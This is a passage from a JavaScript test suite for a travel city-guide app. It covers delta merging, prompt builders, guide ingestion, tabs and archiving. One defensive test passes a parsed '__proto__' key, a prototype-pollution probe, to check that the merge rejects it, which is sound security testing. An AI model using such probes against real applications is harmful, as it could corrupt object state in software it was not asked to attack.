  ['done', 'archived'].forEach((status) => {
    const r = C.mergeDelta(GOOD, {
      schema: 1, delta: true,
      items: [{ id: 'x', section: 'dinner', status: status, name: 'X', links: [] }]
    });
    assert.equal(r.data, null);
    assert.ok(r.errors.some((e) =>
      e.includes('bad status "' + status + '" (a delta may only add plan or backup items)')),
      r.errors.join(' | '));
  });

  const badIntel = bad({ intel: { brasserie: { verdicts: [{ tier: 'nope', text: 'x' }] } } });
  assert.equal(badIntel.data, null);
  assert.ok(badIntel.errors.some((e) => /intel\["brasserie"\]: verdicts\[0\] tier must be must\|good\|skip/.test(e)));
  assert.equal(bad({ intel: [] }).data, null);
  assert.equal(bad({ items: 'nope' }).data, null);
  assert.equal(bad({ sections: 'nope' }).data, null);
  // A rejected delta reports a zeroed summary: nothing partial ever happened.
  assert.deepEqual(bad({ schema: 2 }).summary,
    { added: 0, skipped: 0, sectionsAdded: 0, intelApplied: 0, intelSkipped: 0, ratingsApplied: 0, ratingsSkipped: 0 });
});

test('mergeDelta applies intel to existing ids and counts unknown ids as skipped', () => {
  const d = {
    schema: 1, delta: true,
    intel: {
      brasserie: { verdicts: [{ tier: 'must', text: 'The khachapuri' }], source: 'Reviews' },
      nord: { tips: ['Order at the bar'] },
      ghost: { tips: ['Nobody lives here'] }
    }
  };
  const r = C.mergeDelta(GOOD, d);
  assert.deepEqual(r.errors, []);
  assert.equal(r.summary.intelApplied, 2);
  assert.equal(r.summary.intelSkipped, 1);
  const br = r.data.items.find((it) => it.id === 'brasserie');
  assert.deepEqual(br.intel, { verdicts: [{ tier: 'must', text: 'The khachapuri' }], source: 'Reviews' });
  assert.equal(r.data.items.some((it) => it.id === 'ghost'), false);
});

test('mergeDelta treats a __proto__ intel key as an unknown id, never as a prototype write', () => {
  const d = clone(DELTA);
  // Parsed, not a literal: an object literal's `__proto__` key sets the
  // prototype instead of creating an own property, which would hide the bug
  // this test exists to catch. JSON.parse is also how a real delta arrives.
  d.intel = JSON.parse('{"__proto__": {"verdicts":[{"tier":"must","text":"x"}]}}');
  const r = C.mergeDelta(GOOD, d);
  assert.deepEqual(r.errors, []);
  assert.equal(r.summary.intelSkipped, 1);
  assert.equal(r.summary.intelApplied, 0);
  assert.equal(({}).intel, undefined);
});

test('mergeDelta rejects a delta item whose section is "toString", a prototype method name', () => {
  const d = { schema: 1, delta: true,
    items: [{ id: 'x', section: 'toString', status: 'plan', name: 'X', links: [] }] };
  const r = C.mergeDelta(GOOD, d);
  assert.equal(r.data, null);
  assert.ok(r.errors.some((e) => /unknown section "toString"/.test(e)));
});

test('validate accepts an item id of "valueOf" without a spurious duplicate error', () => {
  const g = clone(GOOD);
  g.items[0].id = 'valueOf';
  assert.deepEqual(C.validate(g), []);
});

test('mergeDelta replaces an existing intel block whole rather than merging into it', () => {
  const base = clone(GOOD);
  base.items[0].intel = { verdicts: [{ tier: 'good', text: 'Old verdict' }], tips: ['Old tip'] };
  const r = C.mergeDelta(base, {
    schema: 1, delta: true, intel: { brasserie: { tips: ['New tip'] } }
  });
  assert.deepEqual(r.data.items[0].intel, { tips: ['New tip'] });
});

test('mergeDelta reaches items the same delta just added', () => {
  const r = C.mergeDelta(GOOD, {
    schema: 1, delta: true,
    items: [{ id: 'fresh', section: 'dinner', status: 'plan', name: 'Fresh', links: [] }],
    intel: { fresh: { tips: ['Book ahead'] } }
  });
  assert.deepEqual(r.errors, []);
  assert.equal(r.summary.intelApplied, 1);
  assert.deepEqual(r.data.items.find((it) => it.id === 'fresh').intel, { tips: ['Book ahead'] });
});

test('mergeDelta never mutates either input', () => {
  const city = clone(GOOD);
  const delta = clone(DELTA);
  const citySnap = JSON.stringify(city);
  const deltaSnap = JSON.stringify(delta);
  const r = C.mergeDelta(city, delta);
  assert.equal(JSON.stringify(city), citySnap);
  assert.equal(JSON.stringify(delta), deltaSnap);
  // And the result is a deep clone, not a view onto either input.
  r.data.items[0].name = 'Mutated';
  r.data.sections[2].label = 'Mutated';
  assert.equal(JSON.stringify(city), citySnap);
  assert.equal(JSON.stringify(delta), deltaSnap);
});

test('mergeDelta never touches city, dates or any other field of an existing item', () => {
  const d = clone(DELTA);
  d.city = { name: 'Hijack', dates: { from: '1999-01-01', to: '1999-01-02' } };
  d.items[0].day = '2026-08-11';
  const r = C.mergeDelta(GOOD, d);
  assert.deepEqual(r.data.city, GOOD.city);
  assert.deepEqual(r.data.city.dates, { from: '2026-08-08', to: '2026-08-15' });
  GOOD.items.forEach((before, i) => {
    const after = clone(r.data.items[i]);
    if (before.id === 'brasserie') delete after.intel;   // the one permitted change
    assert.deepEqual(after, before);
  });
});

test('mergeDelta output passes validate() and round trips through buildExport', () => {
  const r = C.mergeDelta(GOOD, clone(DELTA));
  assert.deepEqual(C.validate(r.data), []);
  const st = C.emptyState();
  const out = C.buildExport(r.data, st);
  assert.deepEqual(C.validate(out), []);
  assert.deepEqual(JSON.parse(JSON.stringify(out)), out);
  const brasserie = out.items.find((it) => it.id === 'brasserie');
  assert.deepEqual(brasserie.intel, DELTA.intel.brasserie);
  assert.ok(out.items.find((it) => it.id === 'boulder'));
  assert.ok(out.sections.find((s) => s.id === 'interests'));
});

test('mergeDelta reads no state: the same call answers identically with no storage at all', () => {
  const src = C.mergeDelta.toString();
  assert.equal(/localStorage|makeStore|liveState|ctx\./.test(src), false);
  const a = C.mergeDelta(GOOD, clone(DELTA));
  const b = C.mergeDelta(GOOD, clone(DELTA));
  assert.deepEqual(a.data, b.data);
  assert.deepEqual(a.summary, b.summary);
});

// ---- Task 3: delta prompt builders ----

const FAKE_RERUN = [
  '# CityOps generation prompt',
  '',
  '### Intel',
  '',
  '<' + '!-- RULES:INTEL -->',
  '- **Restaurants and cafes:** name 2 to 4 specific dishes.',
  '- **Always a source line.**',
  '<' + '!-- /RULES:INTEL -->',
  '',
  '## Output contract',
  '',
  '- `city.dates.from` and `city.dates.to` match the trip dates given above.',
  '',
  '<' + '!-- CONTRACT:ITEM -->',
  '- Every item has `"place_id": null` and `"verified": null`.',
  '- Every item has a unique `id`, a `name`, and a `links` array.',
  '<' + '!-- /CONTRACT:ITEM -->',
  '',
  '## Re-run prompts',
  '',
  '<' + '!-- RERUN:INTERESTS -->',
  'Research this city for the traveler interests listed above.',
  '<' + '!-- /RERUN:INTERESTS -->',
  '',
  '<' + '!-- RERUN:INTEL -->',
  'Research the items listed below, by id.',
  '<' + '!-- /RERUN:INTEL -->',
  '',
  '<' + '!-- RERUN:RATINGS -->',
  'Look up the CURRENT Google Maps rating for each item listed below.',
  '<' + '!-- /RERUN:RATINGS -->',
  '',
  '<' + '!-- RERUN:PLACE -->',
  'Research the ONE place named above and rank it against the section list below.',
  '<' + '!-- /RERUN:PLACE -->'
].join('\n');

const PROFILE = { interests: ['climbing gyms', 'live jazz'], avoid: ['nightclubs'], notes: 'Vegetarian most days.' };

test('buildInterestsDeltaPrompt carries the header, city, profile, re-run block, item list and item shape', () => {
  const out = C.promptKit.buildInterestsDeltaPrompt(FAKE_RERUN, GOOD, PROFILE);
  assert.ok(out.startsWith('You are extending an existing CityOps city guide.'));
  assert.ok(out.includes('- **City:** Batumi'));
  assert.ok(out.includes('- **Country:** GE'));
  assert.ok(out.includes('- **Dates:** 2026-08-08 to 2026-08-15'));
  assert.ok(out.includes('- **Accommodation:** Example Stay D2'));
  // Profile block, same formatter as buildCityPrompt, minus the whole-guide lead.
  assert.ok(out.includes('## Traveler interests'));
  assert.ok(out.includes('- climbing gyms'));
  assert.ok(out.includes('- nightclubs'));
  assert.ok(out.includes('Notes: Vegetarian most days.'));
  assert.equal(out.indexOf('Add a ninth section for these interests'), -1);
  // The landmark block, verbatim and without its landmarks.
  assert.ok(out.includes('Research this city for the traveler interests listed above.'));
  assert.equal(out.indexOf('RERUN:INTERESTS'), -1);
  // Item list, one line per item, after the re-run block that calls it "below".
  assert.ok(out.includes('## Existing items (do not re-suggest these)'));
  assert.ok(out.includes('- brasserie | dinner | Brasserie 1900'));
  assert.ok(out.includes('- nord | coffee | Nord Specialty Coffee'));
  assert.ok(out.indexOf('Research this city for the traveler interests') < out.indexOf('- brasserie | dinner'));
  // Item shape, and NOT the whole-guide contract a delta must never satisfy.
  assert.ok(out.includes('- Every item has a unique `id`, a `name`, and a `links` array.'));
  assert.equal(out.indexOf('match the trip dates given above'), -1);
});

test('buildIntelPassPrompt carries the rules above the instructions and lists every unarchived item', () => {
  const city = clone(GOOD);
  city.items.push({ id: 'gone', section: 'dinner', status: 'archived', name: 'Closed Place', links: [] });
  const out = C.promptKit.buildIntelPassPrompt(FAKE_RERUN, city);
  assert.ok(out.startsWith('You are adding review-verified intel to an existing CityOps city guide.'));
  assert.ok(out.includes('- **City:** Batumi'));
  assert.ok(out.includes('## Intel quality rules'));
  assert.ok(out.includes('- **Restaurants and cafes:** name 2 to 4 specific dishes.'));
  assert.ok(out.includes('Research the items listed below, by id.'));
  // "Follow the Intel quality rules above" only reads correctly in this order.
  assert.ok(out.indexOf('- **Always a source line.**') < out.indexOf('Research the items listed below'));
  assert.ok(out.includes('## Items'));
  assert.ok(out.includes('- brasserie | dinner | Brasserie 1900'));
  assert.ok(out.includes('- sisters | dinner | At the Sisters'));
  assert.equal(out.indexOf('- gone | dinner | Closed Place'), -1);
  assert.ok(out.includes('Cover as many of these as you can verify from real reviews.'));
  assert.equal(out.indexOf('RULES:INTEL'), -1);
  // No profile anywhere: an intel pass is about what is already in the guide.
  assert.equal(out.indexOf('## Traveler interests'), -1);
});

test('the delta builders throw a clear error when a landmark is missing', () => {
  assert.throws(() => C.promptKit.buildInterestsDeltaPrompt('# nothing here', GOOD, PROFILE),
    /no RERUN:INTERESTS block/);
  assert.throws(() => C.promptKit.buildIntelPassPrompt('# nothing here', GOOD),
    /no RULES:INTEL block/);
  const noContract = FAKE_RERUN.split('\n').filter((l) => l.indexOf('CONTRACT:ITEM') === -1).join('\n');
  assert.throws(() => C.promptKit.buildInterestsDeltaPrompt(noContract, GOOD, PROFILE),
    /no CONTRACT:ITEM block/);
  assert.throws(() => C.promptKit.buildIntelPassPrompt(null, GOOD), /no RULES:INTEL block/);
});

test('the delta builders never mutate their inputs and tolerate a bare city', () => {
  const city = clone(GOOD);
  const snap = JSON.stringify(city);
  const p = clone(PROFILE);
  C.promptKit.buildInterestsDeltaPrompt(FAKE_RERUN, city, p);
  C.promptKit.buildIntelPassPrompt(FAKE_RERUN, city);
  assert.equal(JSON.stringify(city), snap);
  assert.deepEqual(p, PROFILE);
  // A city with no items and no optional header fields still builds.
  const bare = { schema: 1, city: { name: 'Tirana', dates: { from: '2026-09-01', to: '2026-09-08' } }, sections: [], items: [] };
  const out = C.promptKit.buildIntelPassPrompt(FAKE_RERUN, bare);
  assert.ok(out.includes('- **City:** Tirana'));
  assert.equal(out.indexOf('- **Country:**'), -1);
  assert.equal(out.indexOf('- **Accommodation:**'), -1);
});

test('the real PROMPT.md carries every landmark the builders slice', () => {
  const fs = require('fs');
  const path = require('path');
  const prompt = fs.readFileSync(path.join(__dirname, '..', 'PROMPT.md'), 'utf8');
  ['RULES:INTEL', 'CONTRACT:ITEM', 'RERUN:INTERESTS', 'RERUN:INTEL', 'RERUN:RATINGS',
    'RERUN:PLACE'].forEach((name) => {
    assert.ok(prompt.indexOf('<' + '!-- ' + name + ' -->') !== -1, 'missing open ' + name);
    assert.ok(prompt.indexOf('<' + '!-- /' + name + ' -->') !== -1, 'missing close ' + name);
  });
  const interests = C.promptKit.buildInterestsDeltaPrompt(prompt, GOOD, PROFILE);
  assert.ok(interests.includes('Never return an item whose id is already in the list below'));
  assert.ok(interests.includes('- brasserie | dinner | Brasserie 1900'));
  const intel = C.promptKit.buildIntelPassPrompt(prompt, GOOD);
  assert.ok(intel.includes('Follow the Intel quality rules above exactly'));
  assert.ok(intel.includes('**Omit `intel` entirely rather than pad it.**'));
  assert.ok(intel.includes('- nord | coffee | Nord Specialty Coffee'));
});

// md ingestion: tools/city-input.js is what embed.js uses to accept either
// cities/<city>.json or a .md handoff from an AI chat (chats often wrap the
// same JSON in a fenced code block instead of returning raw .json).
test('readCityInput: .md with a fenced json block extracts and validates', () => {
  const fs = require('fs');
  const os = require('os');
  const path = require('path');
  const { readCityInput } = require('../tools/city-input');
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'cityops-test-'));
  const mdPath = path.join(dir, 'batumi.md');
  fs.writeFileSync(mdPath,
    'Here is the guide:\n\n```json\n' + JSON.stringify(GOOD) + '\n```\n');
  const res = readCityInput(mdPath);
  assert.equal(res.data.city.name, 'Batumi');
  assert.equal(res.mdSourcePath, mdPath);
  assert.deepEqual(JSON.parse(res.json), GOOD);
  fs.rmSync(dir, { recursive: true });
});
test('readCityInput: .md with no fenced block fails with a retry instruction', () => {
  const fs = require('fs');
  const os = require('os');
  const path = require('path');
  const { readCityInput } = require('../tools/city-input');
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'cityops-test-'));
  const mdPath = path.join(dir, 'batumi.md');
  fs.writeFileSync(mdPath, '# Batumi guide\n\nSorry, ran out of room, ask me for the JSON separately.\n');
  assert.throws(() => readCityInput(mdPath), /json code block/);
  assert.throws(() => readCityInput(mdPath), /reply with the full city guide as a single/);
  fs.rmSync(dir, { recursive: true });
});
test('readCityInput: plain .json is unchanged (no md extraction, no file written)', () => {
  const fs = require('fs');
  const os = require('os');
  const path = require('path');
  const { readCityInput } = require('../tools/city-input');
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'cityops-test-'));
  const jsonPath = path.join(dir, 'batumi.json');
  fs.writeFileSync(jsonPath, JSON.stringify(GOOD));
  const res = readCityInput(jsonPath);
  assert.equal(res.mdSourcePath, null);
  assert.deepEqual(res.data, GOOD);
  assert.deepEqual(fs.readdirSync(dir), ['batumi.json']); // no extra file for a .json input
  fs.rmSync(dir, { recursive: true });
});
test('readCityInput: schema violations fail with the same errors validate() reports', () => {
  const fs = require('fs');
  const os = require('os');
  const path = require('path');
  const { readCityInput } = require('../tools/city-input');
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'cityops-test-'));
  const mdPath = path.join(dir, 'batumi.md');
  const bad = clone(GOOD);
  bad.schema = 2;
  fs.writeFileSync(mdPath, '```json\n' + JSON.stringify(bad) + '\n```\n');
  assert.throws(() => readCityInput(mdPath), /schema must be 1/);
  fs.rmSync(dir, { recursive: true });
});
test('writeCanonicalJson writes cities/<city>.json next to the .md source', () => {
  const fs = require('fs');
  const os = require('os');
  const path = require('path');
  const { readCityInput, writeCanonicalJson } = require('../tools/city-input');
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'cityops-test-'));
  const mdPath = path.join(dir, 'batumi.md');
  fs.writeFileSync(mdPath, '```json\n' + JSON.stringify(GOOD) + '\n```\n');
  const res = readCityInput(mdPath);
  const written = writeCanonicalJson(res.mdSourcePath, res.json);
  assert.equal(written, path.join(dir, 'batumi.json'));
  assert.deepEqual(JSON.parse(fs.readFileSync(written, 'utf8')), GOOD);
  fs.rmSync(dir, { recursive: true });
});

// ---- Phase 3: compact cards, section defaults, Today view, icon controls ----

test('emptyState has an unset viewMode; normalizeState preserves "never chosen"', () => {
  assert.equal(C.emptyState().viewMode, null);
  assert.equal(C.normalizeState({ itemStatus: {} }).viewMode, null); // key absent entirely
  assert.equal(C.normalizeState({ itemStatus: {}, viewMode: null }).viewMode, null); // sentinel round-trips
});
test('setViewMode accepts today, type and day; rejects anything else', () => {
  const st = C.emptyState();
  C.setViewMode(st, 'today');
  assert.equal(st.viewMode, 'today');
  C.setViewMode(st, 'day');
  assert.equal(st.viewMode, 'day');
  assert.throws(() => C.setViewMode(st, 'week'));
});
test('effectiveViewMode: Today inside the stay, Guide outside it, unless already chosen', () => {
  const st = C.emptyState();
  assert.equal(C.effectiveViewMode(GOOD, st, '2026-08-10'), 'today'); // inside 08-08..08-15
  assert.equal(C.effectiveViewMode(GOOD, st, '2026-09-01'), 'type');  // outside the stay
  C.setViewMode(st, 'day');
  assert.equal(C.effectiveViewMode(GOOD, st, '2026-08-10'), 'day'); // an explicit choice always wins
});
// Owner ask 2026-08-26: "default to all accordions be expanded on default".
// The size-based auto-collapse this replaces is gone: no section, at any
// guide size, starts collapsed unless the traveler collapsed it.
test('every section defaults to expanded, at every guide size', () => {
  const st = C.emptyState();
  [0, 10, 40, 400].forEach(n => {
    assert.equal(C.isSectionCollapsed(st, 'dinner', n), false, 'dinner at ' + n);
    assert.equal(C.isSectionCollapsed(st, 'base', n), false, 'base at ' + n);
    assert.equal(C.defaultSectionCollapsed('anything', n), false);
  });
  assert.equal(C.isSectionCollapsed(st, 'dinner'), false); // no totalItems at all
});
test('toggleSection still stores only genuine departures from the default', () => {
  const st = C.emptyState();
  C.toggleSection(st, 'dinner', 40);                    // collapses it: explicit override
  assert.equal(C.isSectionCollapsed(st, 'dinner', 40), true);
  assert.equal(st.collapsedSections.dinner, true);
  C.toggleSection(st, 'dinner', 40);                    // back to the (expanded) default
  assert.ok(!('dinner' in st.collapsedSections));       // override dropped, not just flipped
  assert.equal(C.isSectionCollapsed(st, 'dinner', 40), false);
});
test('Collapse all / Expand all write the same overrides one tap would', () => {
  const st = C.emptyState();
  C.setSectionsCollapsed(st, ['dinner', 'coffee', 'base'], true, 40);
  assert.deepEqual(st.collapsedSections, { dinner: true, coffee: true, base: true });
  ['dinner', 'coffee', 'base'].forEach(id => {
    assert.equal(C.isSectionCollapsed(st, id, 40), true, id);
  });
  // Expand all matches the default, so it CLEARS rather than writing false:
  // the map only ever holds real departures (same rule toggleSection follows).
  C.setSectionsCollapsed(st, ['dinner', 'coffee', 'base'], false, 40);
  assert.deepEqual(st.collapsedSections, {});
  // A section the caller did not name is left exactly as it was.
  C.setSectionsCollapsed(st, ['dinner'], true, 40);
  C.setSectionsCollapsed(st, ['coffee'], false, 40);
  assert.deepEqual(st.collapsedSections, { dinner: true });
  // Garbage in the id list is skipped, not written.
  C.setSectionsCollapsed(st, [null, '', undefined], true, 40);
  assert.deepEqual(st.collapsedSections, { dinner: true });
});
test('Collapse all / Expand all over Plan-tab days', () => {
  const st = C.emptyState();
  C.setPlanDaysCollapsed(st, ['2026-08-10', '2026-08-11'], true);
  assert.deepEqual(st.collapsedPlanDays, { '2026-08-10': true, '2026-08-11': true });
  assert.equal(C.isPlanDayCollapsed(st, '2026-08-10'), true);
  C.setPlanDaysCollapsed(st, ['2026-08-10', '2026-08-11'], false);
  assert.deepEqual(st.collapsedPlanDays, {});   // default is expanded: keys dropped
  assert.equal(C.isPlanDayCollapsed(st, '2026-08-10'), false);
});
test('todayModel groups items dated today; GOOD has no tasks section so tasks stays empty', () => {
  const st = C.emptyState();
  const tm = C.todayModel(GOOD, st, '2026-08-10');
  assert.equal(tm.todayIso, '2026-08-10');
  assert.equal(tm.inRange, true);
  assert.deepEqual(tm.today.map(e => e.it.id), ['tanini']); // dinner item dated 08-10
  // nord (coffee, undated, status plan) is NOT a task: coffee is a normal
  // recommendation section, not a to-do list, so it must not show up here.
  assert.deepEqual(tm.tasks, []);
  assert.deepEqual(tm.upNext, []); // nothing dated 08-11 in GOOD
});
test('todayModel previews tomorrow\'s itinerary item as upNext', () => {
  const st = C.emptyState();
  const tm = C.todayModel(GOOD, st, '2026-08-12'); // tomorrow = 08-13, brasserie's day
  assert.deepEqual(tm.upNext.map(e => e.it.id), ['brasserie']);
  assert.deepEqual(tm.today, []); // nothing dated 08-12
});
test('todayModel: inRange is false outside the stay', () => {
  const st = C.emptyState();
  const tm = C.todayModel(GOOD, st, '2026-09-01');
  assert.equal(tm.inRange, false);
});
test('todayModel never surfaces backup or archived items in the today bucket', () => {
  const st = C.emptyState();
  C.setStatus(st, 'sisters', 'plan'); // would otherwise land in dinner's day slots
  const tm = C.todayModel(GOOD, st, '2026-08-10');
  assert.equal(tm.today.some(e => e.it.id === 'sisters'), false); // still undated, not on today
});
// A dedicated fixture with a real tasks section (Tirana's actual convention:
// id "tasks", label "Open items"), since GOOD has no such section.
const WITH_TASKS = clone(GOOD);
WITH_TASKS.sections.push({ id: 'tasks', label: 'Open items', icon: '☑' });
WITH_TASKS.items.push(
  { id: 'buy-adapter', section: 'tasks', status: 'plan', name: 'Buy a plug adapter', links: [], place_id: null, verified: null },
  { id: 'book-train', section: 'tasks', status: 'plan', name: 'Book the overnight train', links: [], place_id: null, verified: null },
  { id: 'old-errand', section: 'tasks', status: 'done', name: 'Already handled', links: [], place_id: null, verified: null }
);
test('todayModel surfaces undated, open items from a guide\'s tasks section', () => {
  const st = C.emptyState();
  const tm = C.todayModel(WITH_TASKS, st, '2026-08-10');
  assert.deepEqual(tm.tasks.map(e => e.it.id).sort(), ['book-train', 'buy-adapter']);
  // nord (coffee) still never counts as a task, even alongside a real one.
  assert.ok(!tm.tasks.some(e => e.it.id === 'nord'));
});
test('isTaskSection matches by id "tasks" or a "task" label, not any arbitrary section', () => {
  assert.equal(C.isTaskSection({ id: 'tasks', label: 'Open items' }), true);
  assert.equal(C.isTaskSection({ id: 'errands', label: 'To-do / tasks' }), true);
  assert.equal(C.isTaskSection({ id: 'coffee', label: 'Coffee' }), false);
  assert.equal(C.isTaskSection(null), false);
});
test('TRANSITIONS keeps the same to-state semantics under icon-only presentation', () => {
  assert.deepEqual(C.TRANSITIONS.plan.map(t => t.to), ['done', 'backup', 'archived']);
  assert.deepEqual(C.TRANSITIONS.backup.map(t => t.to), ['plan', 'archived']);
  assert.deepEqual(C.TRANSITIONS.done.map(t => t.to), ['plan']);
  assert.deepEqual(C.TRANSITIONS.archived.map(t => t.to), ['backup']);
  // Archive is the one destructive transition that keeps a visible text label.
  assert.equal(C.TRANSITIONS.plan.find(t => t.to === 'archived').label, 'Archive');
  assert.equal(C.TRANSITIONS.plan.find(t => t.to === 'done').label, undefined);
  assert.ok(C.TRANSITIONS.plan.every(t => typeof t.aria === 'string' && t.aria.length));
});

// ---- Phase 4: tabs (Plan / Eat & Drink / Do / Services / Info) ----
test('TABS is the five fixed tabs, in nav order', () => {
  assert.deepEqual(C.TABS.map(t => t.id), ['plan', 'eat', 'do', 'services', 'info']);
  assert.deepEqual(C.TABS.map(t => t.label), ['Plan', 'Eat & Drink', 'Do', 'Services', 'Info']);
});
test('tabForSection maps the PROMPT.md schema sections', () => {
  assert.equal(C.tabForSection({ id: 'dinner', label: 'Dinner' }), 'eat');
  assert.equal(C.tabForSection({ id: 'breakfast', label: 'Breakfast' }), 'eat');
  assert.equal(C.tabForSection({ id: 'lunch', label: 'Lunch' }), 'eat');
  assert.equal(C.tabForSection({ id: 'coffee', label: 'Coffee' }), 'eat');
  // Moved out of Eat & Drink on 2026-08-26 (owner decision): a coworking
  // space is a nomad utility, so it files with laundry and barbers, not
  // between two dinner cards. A sixth tab was the alternative and it loses
  // at 390px, where five chips plus More already fill the row.
  assert.equal(C.tabForSection({ id: 'cowork', label: 'Coworking' }), 'services');
  assert.equal(C.tabForSection({ id: 'laundry', label: 'Laundry' }), 'services');
  assert.equal(C.tabForSection({ id: 'activities', label: 'Activities' }), 'do');
  assert.equal(C.tabForSection({ id: 'interests', label: 'My interests' }), 'do');
  assert.equal(C.tabForSection({ id: 'services', label: 'Services' }), 'services');
  assert.equal(C.tabForSection({ id: 'practical', label: 'Practical' }), 'info');
});
test('tabForSection maps Tirana\'s real freeform sections', () => {
  assert.equal(C.tabForSection({ id: 'base', label: 'Base' }), 'info');
  assert.equal(C.tabForSection({ id: 'money', label: 'Cash & currency' }), 'info');
  assert.equal(C.tabForSection({ id: 'transport', label: 'Transport' }), 'info');
  assert.equal(C.tabForSection({ id: 'restaurants', label: 'Restaurants' }), 'eat');
  assert.equal(C.tabForSection({ id: 'bars', label: 'Bars' }), 'eat');
  assert.equal(C.tabForSection({ id: 'laundry', label: 'Laundry' }), 'services');
  assert.equal(C.tabForSection({ id: 'logistics', label: 'Logistics' }), 'info');
  assert.equal(C.tabForSection({ id: 'context', label: 'Context' }), 'info');
  assert.equal(C.tabForSection({ id: 'corrections', label: 'Corrections' }), 'info');
});
test('tabForSection: known info ids win over the services keyword fallback (real collision)', () => {
  // Tirana's real "safety" section is labeled "Health & safety". A naive
  // keyword match on "health" would misfile it as a services listing;
  // explicit info ids must be checked first.
  assert.equal(C.tabForSection({ id: 'safety', label: 'Health & safety' }), 'info');
});
test('tabForSection: itinerary and any tasks section route to Plan', () => {
  assert.equal(C.tabForSection({ id: 'itinerary', label: 'Daily plan' }), 'plan');
  assert.equal(C.tabForSection({ id: 'tasks', label: 'Open items' }), 'plan');
  assert.equal(C.tabForSection({ id: 'errands', label: 'To-do / tasks' }), 'plan');
});
test('tabForSection: an unrecognized section falls back to Info', () => {
  assert.equal(C.tabForSection({ id: 'weather', label: 'Weather notes' }), 'info');
  assert.equal(C.tabForSection(null), 'info');
});

// ---------------------------------------------------------------------------
// Past cities (state.archived) - owner ask 2026-08-26
// ---------------------------------------------------------------------------
const PAST_DATES = { from: '2026-07-01', to: '2026-07-14' };
const FUTURE_DATES = { from: '2026-12-01', to: '2026-12-14' };
const TODAY_FOR_ARCHIVE = '2026-08-26';

test('a city whose stay has ended reads as past; one that has not does not', () => {
  const st = C.emptyState();
  assert.equal(C.archiveKit.isPast(st, PAST_DATES, TODAY_FOR_ARCHIVE, false), true);
  assert.equal(C.archiveKit.isPast(st, FUTURE_DATES, TODAY_FOR_ARCHIVE, false), false);
  // The last day of the stay is still the stay: you are past it the day after.
  assert.equal(C.archiveKit.isPast(st, { from: '2026-08-20', to: '2026-08-26' },
    TODAY_FOR_ARCHIVE, false), false);
  assert.equal(C.archiveKit.isPast(st, { from: '2026-08-20', to: '2026-08-25' },
    TODAY_FOR_ARCHIVE, false), true);
});

test('the city you are IN never auto-archives, but an explicit archive still wins', () => {
  const st = C.emptyState();
  // Dates say past, but this is the active city: it stays in the live list
  // rather than sliding into a collapsed group under the reader.
  assert.equal(C.archiveKit.isPast(st, PAST_DATES, TODAY_FOR_ARCHIVE, true), false);
  // A deliberate tap is a different thing from a date rolling over.
  C.archiveKit.set(st, true);
  assert.equal(C.archiveKit.isPast(st, PAST_DATES, TODAY_FOR_ARCHIVE, true), true);
});

test('both manual overrides beat the dates, in both directions', () => {
  const early = C.archiveKit.set(C.emptyState(), true);
  assert.equal(C.archiveKit.mode(early), 'archived');
  assert.equal(C.archiveKit.isPast(early, FUTURE_DATES, TODAY_FOR_ARCHIVE, false), true);
  const kept = C.archiveKit.set(C.emptyState(), false);
  assert.equal(C.archiveKit.mode(kept), 'active');
  assert.equal(C.archiveKit.isPast(kept, PAST_DATES, TODAY_FOR_ARCHIVE, false), false);
  assert.equal(C.archiveKit.mode(C.archiveKit.set(kept, null)), 'auto');
});

test('one tap always moves a city the other way, and restoring is one tap', () => {
  // Archived early -> restoring returns it to 'auto' (no override left behind
  // saying what the dates already say).
  const early = C.archiveKit.set(C.emptyState(), true);
  assert.equal(C.archiveKit.nextValue(early, FUTURE_DATES, TODAY_FOR_ARCHIVE, false), null);
  // Past by date -> restoring needs the explicit false, or the date rule would
  // simply re-archive it on the next render.
  const auto = C.emptyState();
  assert.equal(C.archiveKit.nextValue(auto, PAST_DATES, TODAY_FOR_ARCHIVE, false), false);
  // Live city -> the tap archives it.
  assert.equal(C.archiveKit.nextValue(auto, FUTURE_DATES, TODAY_FOR_ARCHIVE, false), true);
  // Active city whose dates have passed: not shown as past, so the tap
  // archives it, and it must NOT hand back a value that leaves it unchanged.
  assert.equal(C.archiveKit.nextValue(auto, PAST_DATES, TODAY_FOR_ARCHIVE, true), true);
  // And every one of those round-trips: applying nextValue then reading isPast
  // gives the opposite of what it was.
  [[auto, PAST_DATES, false], [auto, FUTURE_DATES, false], [early, FUTURE_DATES, false]]
    .forEach(([base, dates, active]) => {
      const before = C.archiveKit.isPast(base, dates, TODAY_FOR_ARCHIVE, active);
      const next = C.archiveKit.set(JSON.parse(JSON.stringify(base)),
        C.archiveKit.nextValue(base, dates, TODAY_FOR_ARCHIVE, active));
      assert.equal(C.archiveKit.isPast(next, dates, TODAY_FOR_ARCHIVE, active), !before);
    });
});

test('the archive flag rides the synced state object and survives a round trip', () => {
  // This is the whole reason it lives here rather than on the app store:
  // normalizeState is what a pulled city_state row goes through.
  const st = C.archiveKit.set(C.emptyState(), true);
  assert.equal(JSON.parse(JSON.stringify(st)).archived, true);
  assert.equal(C.normalizeState(JSON.parse(JSON.stringify(st))).archived, true);
  // A state written before this shipped simply reads as "no override".
  const old = C.emptyState();
  delete old.archived;
  assert.equal(C.normalizeState(old).archived, null);
  // Garbage off a hand-edited payload is corrected, never coerced.
  ['yes', 1, 0, {}, []].forEach(v => {
    assert.equal(C.normalizeState(Object.assign(C.emptyState(), { archived: v })).archived, null,
      String(v));
  });
});
test('tabForSection: the services keyword fallback only fires for ids it does not already know', () => {
  // Not one of the explicit ids anywhere: caught by the keyword match instead.
  assert.equal(C.tabForSection({ id: 'barber-shops', label: 'Barbers' }), 'services');
  assert.equal(C.tabForSection({ id: 'misc', label: 'Massage parlors' }), 'services');
});
test('setTab validates against the five ids; effectiveTab defaults to plan', () => {
  const st = C.emptyState();
  assert.equal(C.effectiveTab(st), 'plan'); // never chosen
  C.setTab(st, 'eat');
  assert.equal(st.tab, 'eat');
  assert.equal(C.effectiveTab(st), 'eat');
  assert.throws(() => C.setTab(st, 'guide')); // not one of the five tabs
});
test('normalizeState defaults tab to null (never chosen) and corrects a bogus stored value to plan', () => {
  assert.equal(C.normalizeState({ itemStatus: {} }).tab, null); // key absent entirely
  assert.equal(C.normalizeState({ itemStatus: {}, tab: null }).tab, null); // sentinel round-trips
  assert.equal(C.normalizeState({ itemStatus: {}, tab: 'guide' }).tab, 'plan'); // stray value corrected
